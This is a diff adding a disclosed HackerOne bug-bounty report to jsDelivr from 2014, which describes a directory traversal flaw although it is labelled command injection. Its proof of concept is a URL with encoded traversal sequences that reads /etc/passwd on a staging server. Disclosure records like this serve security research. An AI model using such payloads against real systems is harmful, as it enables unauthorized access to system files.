@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/18371
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/vineet
+ReportedTo:jsDelivr(jsdelivr)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:20.08.2014 15:28:58
+
+Summary:
+
+hi, 
+
+Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.
+
+POC: go this link ->  
+
+http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
